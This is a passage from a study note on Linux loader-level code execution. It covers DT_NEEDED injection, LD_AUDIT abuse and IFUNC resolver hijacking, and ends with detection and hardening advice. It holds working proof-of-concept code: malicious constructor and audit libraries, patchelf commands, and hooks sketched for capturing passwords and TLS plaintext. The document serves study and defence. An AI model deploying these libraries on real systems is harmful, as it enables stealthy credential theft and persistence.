│      │ d. Add to loaded libraries list                                │     │
│      └────────────────────────────────────────────────────────────────┘     │
│        │                                                                    │
│        ▼                                                                    │
│   3. Run initialization functions (dependency order)                        │
│        │                                                                    │
│        ▼                                                                    │
│   4. Continue to program _start                                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 7.3 Attack Implementation

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    DT_NEEDED INJECTION ATTACK                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   STEP 1: Create Malicious Library                                          │
│   ──────────────────────────────────                                        │
│                                                                             │
│   $ cat > evil.c << 'EOF'                                                   │
│   __attribute__((constructor))                                              │
│   void pwn(void) {                                                          │
│       // Malicious code here                                                │
│       system("id > /tmp/NEEDED_PWNED");                                     │
│   }                                                                         │
│   EOF                                                                       │
│   $ gcc -shared -fPIC -o /tmp/evil.so evil.c                                │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   STEP 2: Add Library to Binary's DT_NEEDED                                 │
│   ──────────────────────────────────────────                                │
│                                                                             │
│   $ cp ./victim ./victim_evil                                               │
│   $ patchelf --add-needed /tmp/evil.so ./victim_evil                        │
│                                                                             │
│   Verify:                                                                   │
│   $ readelf -d ./victim_evil | grep NEEDED                                  │
│   0x0000000000000001 (NEEDED)  Shared library: [/tmp/evil.so]   ← ADDED!    │
│   0x0000000000000001 (NEEDED)  Shared library: [libc.so.6]                  │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   STEP 3: Execute Modified Binary                                           │
│   ────────────────────────────────                                          │
│                                                                             │
│   $ ./victim_evil                                                           │
│   [normal program output]                                                   │
│                                                                             │
│   $ cat /tmp/NEEDED_PWNED                                                   │
│   uid=1000(user) gid=1000(user) groups=1000(user)                           │
│                                                                             │
│   evil.so's constructor ran BEFORE main()!                                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 7.4 Comparison with Other Methods

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    DT_NEEDED vs LD_PRELOAD vs PT_INTERP                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌─────────────────┬──────────────────┬─────────────────┬────────────────┐ │
│   │ Aspect          │ DT_NEEDED        │ LD_PRELOAD      │ PT_INTERP      │ │
│   ├─────────────────┼──────────────────┼─────────────────┼────────────────┤ │
│   │ Modification    │ Binary           │ Environment     │ Binary/Loader  │ │
│   │ Persistence     │ Per-binary       │ Per-session     │ System-wide    │ │
│   │ SUID bypass     │ Yes              │ No              │ Yes            │ │
│   │ Detection       │ readelf -d       │ env / strace    │ readelf -l     │ │
│   │ Stealth         │ Medium           │ Low             │ High           │ │
│   │ Required access │ Write to binary  │ Env control     │ Write to ld.so │ │
│   └─────────────────┴──────────────────┴─────────────────┴────────────────┘ │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 8. LD_AUDIT Interface Abuse

### 8.1 Overview

The `rtld-audit` interface is a legitimate debugging feature that allows a shared library to receive callbacks for every symbol resolution. Attackers can abuse this to intercept and modify ALL function calls.

### 8.2 Audit Interface Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    LD_AUDIT MECHANISM                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   $ LD_AUDIT=/path/to/audit.so ./program                                    │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                     DYNAMIC LINKER                                  │   │
│   │                                                                     │   │
│   │   1. Check LD_AUDIT environment variable                            │   │
│   │   2. Load audit library FIRST                                       │   │
│   │   3. Call la_version() to verify ABI compatibility                  │   │
│   │   4. For each event, call appropriate callback:                     │   │
│   │                                                                     │   │
│   │   ┌─────────────────────────────────────────────────────────────┐   │   │
│   │   │ AUDIT CALLBACKS                                             │   │   │
│   │   ├─────────────────────────────────────────────────────────────┤   │   │
│   │   │ la_version()    - Return audit interface version            │   │   │
│   │   │ la_objsearch()  - Called when searching for library         │   │   │
│   │   │ la_objopen()    - Called when library is loaded             │   │   │
│   │   │ la_symbind32/64() - Called for EACH symbol resolution       │   │   │
│   │   │ la_preinit()    - Before running initializers               │   │   │
│   │   │ la_objclose()   - When library is unloaded                  │   │   │
│   │   └─────────────────────────────────────────────────────────────┘   │   │
│   │                                                                     │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   POWER: la_symbind64() can CHANGE the resolved address!                    │
│   ───────────────────────────────────────────────────────                   │
│   Return a different address → hijack ANY function call                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 8.3 Malicious Audit Library

```c
/*
 * evil_audit.c - Malicious LD_AUDIT library
 *
 * Compile: gcc -shared -fPIC -o evil_audit.so evil_audit.c
 * Usage:   LD_AUDIT=./evil_audit.so ./victim
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <link.h>
#include <dlfcn.h>

/* Log file for captured data */
static FILE *logfile = NULL;

/* Required: Return audit interface version */
unsigned int la_version(unsigned int version) {
    logfile = fopen("/tmp/AUDIT_LOG", "w");
    if (logfile) {
        fprintf(logfile, "[LD_AUDIT] Audit library loaded, version %u\n", version);
        fflush(logfile);
    }
    return LAV_CURRENT;
}

/* Called when searching for a library */
char *la_objsearch(const char *name, uintptr_t *cookie, unsigned int flag) {
    if (logfile) {
        fprintf(logfile, "[SEARCH] Looking for: %s (flag=%u)\n", name, flag);
        fflush(logfile);
    }

    /* Could redirect to malicious library here! */
    /* return "/tmp/evil_libc.so"; */

    return (char *)name;  /* Return original name */
}

/* Called when a library is loaded */
unsigned int la_objopen(struct link_map *map, Lmid_t lmid, uintptr_t *cookie) {
    if (logfile) {
        fprintf(logfile, "[LOADED] %s at %p\n", map->l_name, (void *)map->l_addr);
        fflush(logfile);
    }

    /* Return flags indicating which bindings to audit */
    return LA_FLG_BINDTO | LA_FLG_BINDFROM;
}

/* Called for EVERY symbol resolution - this is the powerful one! */
uintptr_t la_symbind64(Elf64_Sym *sym, unsigned int ndx,
                       uintptr_t *refcook, uintptr_t *defcook,
                       unsigned int *flags, const char *symname) {

    if (logfile) {
        fprintf(logfile, "[BIND] %s -> %p\n", symname, (void *)sym->st_value);
        fflush(logfile);
    }

    /* ATTACK: Redirect specific functions */
    if (strcmp(symname, "getpass") == 0) {
        /*
         * Redirect getpass() to our evil_getpass()
         * This would capture all password input!
         *
         * static void *evil_getpass_ptr = NULL;
         * if (!evil_getpass_ptr) {
         *     evil_getpass_ptr = dlsym(RTLD_DEFAULT, "evil_getpass");
         * }
         * return (uintptr_t)evil_getpass_ptr;
         */
    }

    if (strcmp(symname, "SSL_write") == 0) {
        /* Could intercept encrypted data before encryption! */
        fprintf(logfile, "[CRYPTO] SSL_write hooked - could capture plaintext!\n");
        fflush(logfile);
    }

    /* Return original address (or modified address for hijack) */
    return sym->st_value;
}

/* Called before program initialization */
void la_preinit(uintptr_t *cookie) {
    if (logfile) {
        fprintf(logfile, "[PREINIT] About to run constructors\n");
        fflush(logfile);
    }
}

/* Called when library is unloaded */
unsigned int la_objclose(uintptr_t *cookie) {
    if (logfile) {
        fprintf(logfile, "[CLOSE] Library unloaded\n");
        fclose(logfile);
        logfile = NULL;
    }
    return 0;
}
```

### 8.4 Attack Scenarios

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    LD_AUDIT ATTACK SCENARIOS                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   SCENARIO 1: Credential Harvesting                                         │
│   ──────────────────────────────────                                        │
│   Hook: getpass, read (on stdin), crypt, PAM functions                      │
│   Target: sudo, su, login, ssh, any password prompt                         │
│   Method: Log plaintext before it's processed                               │
│                                                                             │
│   la_symbind64(..., "getpass") {                                            │
│       // Return wrapper that logs password then calls real getpass          │
│       return (uintptr_t)evil_getpass;                                       │
│   }                                                                         │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   SCENARIO 2: SSL/TLS Interception                                          │
│   ─────────────────────────────────                                         │
│   Hook: SSL_read, SSL_write, EVP_EncryptUpdate                              │
│   Target: Any TLS-enabled application                                       │
│   Method: Capture plaintext before encryption                               │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   SCENARIO 3: Library Redirection                                           │
│   ────────────────────────────────                                          │
│   Hook: la_objsearch()                                                      │
│   Target: Any library load                                                  │
│   Method: Return path to malicious library                                  │
│                                                                             │
│   char *la_objsearch(const char *name, ...) {                               │
│       if (strstr(name, "libcrypto"))                                        │
│           return "/tmp/evil_libcrypto.so";                                  │
│       return name;                                                          │
│   }                                                                         │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   SCENARIO 4: Function Result Modification                                  │
│   ─────────────────────────────────────────                                 │
│   Hook: getuid, geteuid, access, stat                                       │
│   Target: Permission-checking programs                                      │
│   Method: Return modified values to bypass checks                           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 8.5 Security Restrictions

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    LD_AUDIT RESTRICTIONS                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Like LD_PRELOAD, LD_AUDIT is ignored when:                                │
│                                                                             │
│   1. Binary is SUID/SGID                                                    │
│   2. Binary has capabilities                                                │
│   3. Real UID != Effective UID (AT_SECURE set)                              │
│                                                                             │
│   HOWEVER:                                                                  │
│   ─────────                                                                 │
│   Root can add audit libraries to /etc/ld.so.preload                        │
│   (Though this is typically used for LD_PRELOAD libraries)                  │
│                                                                             │
│   Audit libraries can also be specified via:                                │
│   - /etc/ld.so.conf entries (with audit flag)                               │
│   - Binary's DT_AUDIT entry (if compiled with --audit)                      │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 9. IFUNC Resolver Hijacking

### 9.1 Overview

GNU Indirect Functions (IFUNC) allow libraries to select function implementations at runtime. Each IFUNC has a **resolver function** that runs during symbol resolution and returns the actual function address. Hijacking resolvers = pre-main code execution.

### 9.2 IFUNC Mechanism

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    IFUNC RESOLUTION PROCESS                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   IFUNC PURPOSE:                                                            │
│   ──────────────                                                            │
│   Select optimal function implementation based on runtime CPU features      │
│                                                                             │
│   Example: memcpy has multiple implementations:                             │
│   - memcpy_sse2    (for SSE2 capable CPUs)                                  │
│   - memcpy_avx2    (for AVX2 capable CPUs)                                  │
│   - memcpy_avx512  (for AVX-512 capable CPUs)                               │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   SYMBOL TABLE ENTRY:                                                       │
│   ───────────────────                                                       │
│                                                                             │
│   $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep memcpy                │
│   1234: 0x00123456  100 IFUNC  GLOBAL DEFAULT  14 memcpy@@GLIBC_2.14        │
│                         ^^^^^                                               │
│                         IFUNC type, not FUNC                                │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   RESOLUTION FLOW:                                                          │
│   ────────────────                                                          │
│                                                                             │
│   1. Linker encounters IFUNC symbol "memcpy"                                │
│        │                                                                    │
│        ▼                                                                    │
│   2. Symbol address points to RESOLVER function, not memcpy itself          │
│        │                                                                    │
│        ▼                                                                    │
│   3. Linker CALLS the resolver: resolver_memcpy()                           │
│      ┌─────────────────────────────────────────────────────────────────┐    │
│      │ void *resolver_memcpy(void) {                                   │    │
│      │     if (cpu_has_avx512())                                       │    │
│      │         return memcpy_avx512;                                   │    │
│      │     else if (cpu_has_avx2())                                    │    │
│      │         return memcpy_avx2;                                     │    │
│      │     else                                                        │    │
│      │         return memcpy_sse2;                                     │    │
│      │ }                                                               │    │
│      └─────────────────────────────────────────────────────────────────┘    │
│        │                                                                    │
│        ▼                                                                    │
│   4. Resolver returns address of optimal implementation                     │
│        │                                                                    │
│        ▼                                                                    │
│   5. Linker stores returned address in GOT                                  │
│        │                                                                    │
│        ▼                                                                    │
│   6. All future memcpy calls go directly to selected implementation         │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 9.3 Attack Mechanism

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    IFUNC RESOLVER HIJACKING                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   KEY INSIGHT:                                                              │
│   ────────────                                                              │
│   Resolver functions are CALLED by the linker during startup.               │
│   If we can overwrite a resolver, we get code execution!                    │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   ATTACK VECTOR 1: Overwrite Resolver Pointer                               │
│   ─────────────────────────────────────────────                             │
│                                                                             │
│   If you have arbitrary write BEFORE symbol resolution:                     │
│                                                                             │
│   1. Find IFUNC symbol in .dynsym                                           │
│   2. Overwrite st_value to point to your shellcode                          │
│   3. When linker resolves the IFUNC, it calls your code                     │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   ATTACK VECTOR 2: Binary Patching                                          │
│   ─────────────────────────────────                                         │
│                                                                             │
│   Modify an IFUNC symbol in the binary:                                     │
│                                                                             │
│   Original .dynsym entry:                                                   │
│   memcpy: st_value = 0x12345 (resolver address)                             │
│           st_info  = STT_GNU_IFUNC                                          │
│                                                                             │
│   Patched .dynsym entry:                                                    │
│   memcpy: st_value = 0x99999 (evil resolver address)                        │
│           st_info  = STT_GNU_IFUNC                                          │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   ATTACK VECTOR 3: Malicious Library with IFUNC                             │
│   ──────────────────────────────────────────────                            │
│                                                                             │
│   Create library with IFUNC that runs malicious code:                       │
│                                                                             │
│   static void *evil_resolver(void) {                                        │
│       system("id > /tmp/IFUNC_PWNED");  // Runs during resolution!          │
│       return real_function;                                                 │
│   }                                                                         │
│                                                                             │
│   void *my_function(void) __attribute__((ifunc("evil_resolver")));          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 9.4 Creating Malicious IFUNC Library

```c
/*
 * evil_ifunc.c - Malicious IFUNC demonstration
 *
 * Compile: gcc -shared -fPIC -o evil_ifunc.so evil_ifunc.c
 * Usage:   LD_PRELOAD=./evil_ifunc.so ./victim
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/* The actual function implementation */
static int real_my_function(int x) {
    return x * 2;
}

/*
 * Resolver function - runs during symbol resolution!
 * This executes BEFORE main() and BEFORE constructors!
 */
static void *my_function_resolver(void) {
    /*
     * DANGER: Very limited environment here!
     * - No libc functions are safe to call
     * - Must use raw syscalls for anything complex
     * - Even printf may not work
     */

    /* Raw syscall to create marker file */
    /* This is safer than calling libc functions */
    const char *path = "/tmp/IFUNC_PWNED";
    const char *msg = "[IFUNC] Resolver executed during symbol resolution!\n";

    /* Use syscalls directly for safety */
    int fd;
    asm volatile (
        "mov $2, %%rax\n"      /* SYS_open */
        "mov %1, %%rdi\n"      /* path */
        "mov $0x241, %%rsi\n"  /* O_WRONLY|O_CREAT|O_TRUNC */
        "mov $0x1a4, %%rdx\n"  /* 0644 */
        "syscall\n"
        "mov %%eax, %0\n"
        : "=r"(fd)
        : "r"(path)
        : "rax", "rdi", "rsi", "rdx"
    );

    if (fd >= 0) {
        asm volatile (
            "mov $1, %%rax\n"      /* SYS_write */
            "mov %0, %%rdi\n"      /* fd */
            "mov %1, %%rsi\n"      /* msg */
            "mov $55, %%rdx\n"     /* len */
            "syscall\n"
            :
            : "r"(fd), "r"(msg)
            : "rax", "rdi", "rsi", "rdx"
        );

        asm volatile (
            "mov $3, %%rax\n"      /* SYS_close */
            "mov %0, %%rdi\n"      /* fd */
            "syscall\n"
            :
            : "r"(fd)
            : "rax", "rdi"
        );
    }

    return real_my_function;
}

/* Declare function as IFUNC with our malicious resolver */
int my_function(int x) __attribute__((ifunc("my_function_resolver")));

/*
 * Force the symbol to be resolved by using it in a constructor
 * (This ensures the resolver runs)
 */
__attribute__((constructor))
void trigger_ifunc(void) {
    volatile int result = my_function(21);
    (void)result;
}
```

### 9.5 IFUNC Execution Timeline

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    IFUNC EXECUTION TIMING                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   execve()                                                                  │
│      │                                                                      │
│      ▼                                                                      │
│   Load ld-linux.so                                                          │
│      │                                                                      │
│      ▼                                                                      │
│   Load shared libraries                                                     │
│      │                                                                      │
│      ▼                                                                      │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │ IFUNC RESOLUTION (varies based on BIND_NOW)                          │  │
│   │                                                                      │  │
│   │ With lazy binding (default):                                         │  │
│   │   IFUNC resolvers run on first call to each IFUNC                    │  │
│   │   May be before or after main()                                      │  │
│   │                                                                      │  │
│   │ With BIND_NOW (ld -z now):                                           │  │
│   │   ALL IFUNC resolvers run during startup                             │  │
│   │   ★ BEFORE .preinit_array ★                                          │  │
│   │   ★ BEFORE .init_array ★                                             │  │
│   │   ★ BEFORE main() ★                                                  │  │
│   │                                                                      │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│      │                                                                      │
│      ▼                                                                      │
│   .preinit_array                                                            │
│      │                                                                      │
│      ▼                                                                      │
│   .init_array (libraries then program)                                      │
│      │                                                                      │
│      ▼                                                                      │
│   main()                                                                    │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   IFUNC resolvers run in the MOST RESTRICTED environment:                   │
│   - Minimal stack                                                           │
│   - Not all libc functions work                                             │
│   - Raw syscalls are safest                                                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 10. Comparison Matrix

```
┌──────────────────────────────────────────────────────────────────────────────────────────┐
│                              ATTACK COMPARISON MATRIX                                    │
├────────────────┬──────────┬──────────┬──────────┬───────────┬────────────┬──────────────┤
│ Attack         │ Requires │ Persists │ SUID     │ Detection │ Stealth    │ Power        │
│                │          │          │ Works?   │ Difficulty│            │              │
├────────────────┼──────────┼──────────┼──────────┼───────────┼────────────┼──────────────┤
│ PT_INTERP      │ Binary   │ Yes      │ Yes      │ Medium    │ Very High  │ Maximum      │
│ (Trojanized    │ patch or │ (disk)   │          │ (hash     │ (normal    │ (all code    │
│ Loader)        │ root     │          │          │ verify)   │ execution) │ executes)    │
├────────────────┼──────────┼──────────┼──────────┼───────────┼────────────┼──────────────┤
│ LD_PRELOAD     │ Env      │ No       │ No       │ Easy      │ Low        │ High         │
│                │ control  │ (session)│          │ (env/     │ (visible   │ (hook any    │
│                │          │          │          │ strace)   │ in env)    │ function)    │
├────────────────┼──────────┼──────────┼──────────┼───────────┼────────────┼──────────────┤
│ /etc/ld.so.    │ Root     │ Yes      │ YES!     │ Easy      │ Medium     │ Very High    │
│ preload        │          │ (disk)   │          │ (file     │            │ (all progs)  │
│                │          │          │          │ check)    │            │              │
├────────────────┼──────────┼──────────┼──────────┼───────────┼────────────┼──────────────┤
│ GOT/PLT        │ Memory   │ No       │ N/A      │ Medium    │ High       │ High         │
│ Hijack         │ write    │ (runtime)│ (vuln)   │ (runtime  │ (no disk   │ (redirect    │
│                │ vuln     │          │          │ only)     │ change)    │ calls)       │
├────────────────┼──────────┼──────────┼──────────┼───────────┼────────────┼──────────────┤
│ .init_array    │ Binary   │ Yes      │ Yes      │ Medium    │ High       │ Medium       │
│                │ patch    │ (disk)   │          │ (readelf) │            │ (pre-main)   │
├────────────────┼──────────┼──────────┼──────────┼───────────┼────────────┼──────────────┤
│ DT_RPATH/      │ Binary   │ Yes      │ Yes      │ Medium    │ Medium     │ High         │
│ RUNPATH        │ patch +  │ (disk)   │          │ (readelf) │ (path      │ (lib         │
│                │ lib dir  │          │          │           │ visible)   │ replace)     │
├────────────────┼──────────┼──────────┼──────────┼───────────┼────────────┼──────────────┤
│ DT_NEEDED      │ Binary   │ Yes      │ Yes      │ Easy      │ Medium     │ Medium       │
│ Injection      │ patch    │ (disk)   │          │ (readelf) │ (lib       │ (pre-main)   │
│                │          │          │          │           │ visible)   │              │
├────────────────┼──────────┼──────────┼──────────┼───────────┼────────────┼──────────────┤
│ LD_AUDIT       │ Env      │ No       │ No       │ Easy      │ Low        │ Maximum      │
│                │ control  │ (session)│          │ (env)     │ (visible)  │ (hook ALL    │
│                │          │          │          │           │            │ symbols)     │
├────────────────┼──────────┼──────────┼──────────┼───────────┼────────────┼──────────────┤
│ IFUNC          │ Binary   │ Yes      │ Yes      │ Hard      │ Very High  │ Medium       │
│ Hijack         │ patch or │ (disk)   │          │ (complex  │ (obscure   │ (early       │
│                │ lib      │          │          │ analysis) │ mechanism) │ execution)   │
└────────────────┴──────────┴──────────┴──────────┴───────────┴────────────┴──────────────┘
```

### Execution Order Timeline

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    ATTACK EXECUTION TIMELINE                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   EARLIEST ──────────────────────────────────────────────────────► LATEST   │
│                                                                             │
│   ┌───────────────────────────────────────────────────────────────────────┐ │
│   │ execve()                                                              │ │
│   └───────────────────────────────────────────────────────────────────────┘ │
│          │                                                                  │
│          ▼                                                                  │
│   ┌───────────────────────────────────────────────────────────────────────┐ │
│   │ 1. PT_INTERP - Trojanized Loader Entry Point                          │ │
│   │    ★ EARLIEST POSSIBLE CODE EXECUTION ★                               │ │
│   └───────────────────────────────────────────────────────────────────────┘ │
│          │                                                                  │
│          ▼                                                                  │
│   ┌───────────────────────────────────────────────────────────────────────┐ │
│   │ 2. LD_AUDIT la_version() called                                       │ │
│   └───────────────────────────────────────────────────────────────────────┘ │
│          │                                                                  │
│          ▼                                                                  │
│   ┌───────────────────────────────────────────────────────────────────────┐ │
│   │ 3. DT_RPATH/RUNPATH library resolution                                │ │
│   │    (Malicious library loaded instead of real one)                     │ │
│   └───────────────────────────────────────────────────────────────────────┘ │
│          │                                                                  │
│          ▼                                                                  │
│   ┌───────────────────────────────────────────────────────────────────────┐ │
│   │ 4. LD_PRELOAD libraries loaded                                        │ │
│   │ 5. DT_NEEDED libraries loaded                                         │ │
│   └───────────────────────────────────────────────────────────────────────┘ │
│          │                                                                  │
│          ▼                                                                  │
│   ┌───────────────────────────────────────────────────────────────────────┐ │
│   │ 6. IFUNC resolvers called (with BIND_NOW)                             │ │
│   │    LD_AUDIT la_symbind64() for each symbol                            │ │
│   └───────────────────────────────────────────────────────────────────────┘ │
│          │                                                                  │
│          ▼                                                                  │
│   ┌───────────────────────────────────────────────────────────────────────┐ │
│   │ 7. .preinit_array functions (main executable only)                    │ │
│   └───────────────────────────────────────────────────────────────────────┘ │
│          │                                                                  │
│          ▼                                                                  │
│   ┌───────────────────────────────────────────────────────────────────────┐ │
│   │ 8. Library .init_array (LD_PRELOAD libs, then DT_NEEDED libs)         │ │
│   │    __attribute__((constructor)) functions                             │ │
│   └───────────────────────────────────────────────────────────────────────┘ │
│          │                                                                  │
│          ▼                                                                  │
│   ┌───────────────────────────────────────────────────────────────────────┐ │
│   │ 9. Program .init_array                                                │ │
│   └───────────────────────────────────────────────────────────────────────┘ │
│          │                                                                  │
│          ▼                                                                  │
│   ┌───────────────────────────────────────────────────────────────────────┐ │
│   │ 10. _start → __libc_start_main → main()                               │ │
│   └───────────────────────────────────────────────────────────────────────┘ │
│          │                                                                  │
│          ▼                                                                  │
│   ┌───────────────────────────────────────────────────────────────────────┐ │
│   │ 11. GOT/PLT hijacking (requires vulnerability during execution)       │ │
│   │     IFUNC resolution (lazy binding, on first call)                    │ │
│   └───────────────────────────────────────────────────────────────────────┘ │
│          │                                                                  │
│          ▼                                                                  │
│   ┌───────────────────────────────────────────────────────────────────────┐ │
│   │ 12. .fini_array (on exit)                                             │ │
│   └───────────────────────────────────────────────────────────────────────┘ │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 11. Detection & Mitigations

### 11.1 Detection Methods

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    DETECTION TECHNIQUES                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ENVIRONMENT MONITORING                                                    │
│   ──────────────────────                                                    │
│   # Check running processes for suspicious LD_* variables                   │
│   for pid in /proc/[0-9]*; do                                               │
│       grep -a "LD_PRELOAD\|LD_AUDIT\|LD_LIBRARY_PATH" \                     │
│           $pid/environ 2>/dev/null && echo "PID: ${pid##*/}"                │
│   done                                                                      │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   FILE INTEGRITY                                                            │
│   ──────────────                                                            │
│   # Check system loader hash                                                │
│   sha256sum /lib64/ld-linux-x86-64.so.2                                     │
│   sha256sum /lib/x86_64-linux-gnu/libc.so.6                                 │
│                                                                             │
│   # Check /etc/ld.so.preload                                                │
│   cat /etc/ld.so.preload 2>/dev/null                                        │
│                                                                             │
│   # Verify package integrity                                                │
│   rpm -Va | grep ld-linux                                                   │
│   dpkg -V libc6                                                             │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   BINARY ANALYSIS                                                           │
│   ───────────────                                                           │
│   # Check for unusual DT_NEEDED entries                                     │
│   for f in /usr/bin/*; do                                                   │
│       readelf -d "$f" 2>/dev/null | grep NEEDED | grep -v "lib[a-z]"        │
│   done                                                                      │
│                                                                             │
│   # Check for unusual interpreters                                          │
│   find /usr/bin -type f -exec sh -c '                                       │
│       interp=$(readelf -l "$1" 2>/dev/null | grep interpreter | \           │
│                sed "s/.*: //;s/]//")                                        │
│       [ -n "$interp" ] && [ "$interp" != "/lib64/ld-linux-x86-64.so.2" ] \  │
│           && echo "$1: $interp"                                             │
│   ' _ {} \;                                                                 │
│                                                                             │
│   # Check for RPATH/RUNPATH                                                 │
│   readelf -d /path/to/binary | grep -E "RPATH|RUNPATH"                      │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   RUNTIME MONITORING                                                        │
│   ──────────────────                                                        │
│   # Use strace to see library loading                                       │
│   strace -f -e openat ./program 2>&1 | grep "\.so"                          │
│                                                                             │
│   # Check loaded libraries of running process                               │
│   cat /proc/<pid>/maps | grep "\.so"                                        │
│   lsof -p <pid> | grep "\.so"                                               │
│                                                                             │
│   # Use LD_DEBUG to trace loading                                           │
│   LD_DEBUG=libs ./program 2>&1 | head -50                                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 11.2 Mitigations

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    MITIGATION STRATEGIES                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   COMPILE-TIME PROTECTIONS                                                  │
│   ────────────────────────                                                  │
│                                                                             │
│   # Full RELRO (read-only GOT)                                              │
│   gcc -Wl,-z,relro,-z,now -o binary source.c                                │
│                                                                             │
│   # Static linking (no dynamic loader)                                      │
│   gcc -static -o binary source.c                                            │
│                                                                             │
│   # Remove RPATH                                                            │
│   patchelf --remove-rpath ./binary                                          │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   SYSTEM HARDENING                                                          │
│   ────────────────                                                          │
│                                                                             │
│   # Make /etc/ld.so.preload immutable                                       │
│   chattr +i /etc/ld.so.preload                                              │
│                                                                             │
│   # Read-only /lib mount (requires careful planning)                        │
│   mount -o remount,ro /lib                                                  │
│                                                                             │
│   # Use dm-verity for verified boot                                         │
│   # Ensures /lib and loader integrity                                       │
│                                                                             │
│   # Enable IMA (Integrity Measurement Architecture)                         │
│   # Kernel measures and verifies file integrity                             │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   RUNTIME PROTECTIONS                                                       │
│   ────────────────────                                                      │
│                                                                             │
│   # SELinux/AppArmor policies                                               │
│   # Restrict library loading paths                                          │
│                                                                             │
│   # Seccomp filters                                                         │
│   # Block execve with LD_PRELOAD set                                        │
│                                                                             │
│   # File integrity monitoring (AIDE, Tripwire)                              │
│   aide --init && aide --check                                               │
│                                                                             │
│   # eBPF-based monitoring                                                   │
│   # Trace library loads and suspicious patterns                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 12. Conclusion

### 12.1 Key Takeaways

1. **The loader/linker phase is a critical attack surface** - Code execution here precedes all application security measures.

2. **Multiple attack vectors target the same execution phase** - Understanding one helps understand all.

3. **Trade-offs exist between stealth, persistence, and required access** - Choose technique based on objectives.

4. **Detection requires multi-layer monitoring** - Environment, files, runtime behavior.

5. **Static linking eliminates this entire attack surface** - But at cost of binary size and update complexity.

### 12.2 Research Progression

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    RECOMMENDED STUDY PATH                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   FOUNDATIONAL                                                              │
│   ────────────                                                              │
│   ✓ ELF Format (your 01a note)                                              │
│   ✓ Memory Layout (your 01 note)                                            │
│   ✓ Process Execution Flow (your 01b note)                                  │
│   ✓ Trojanized Loader (your main document)                                  │
│                                                                             │
│   LOADER-LEVEL ATTACKS (this document)                                      │
│   ─────────────────────────────────────                                     │
│   □ LD_PRELOAD Injection                                                    │
│   □ GOT/PLT Hijacking                                                       │
│   □ .init_array Attacks                                                     │
│   □ DT_RPATH Poisoning                                                      │
│   □ DT_NEEDED Injection                                                     │
│   □ LD_AUDIT Abuse                                                          │
│   □ IFUNC Hijacking                                                         │
│                                                                             │
│   ADVANCED TOPICS                                                           │
│   ───────────────                                                           │
│   → Return-Oriented Programming (ROP)                                       │
│   → Format String Exploitation                                              │
│   → Heap Exploitation (ptmalloc internals)                                  │
│   → Kernel-Level Attacks (rootkits)                                         │
│   → eBPF for Detection/Attack                                               │
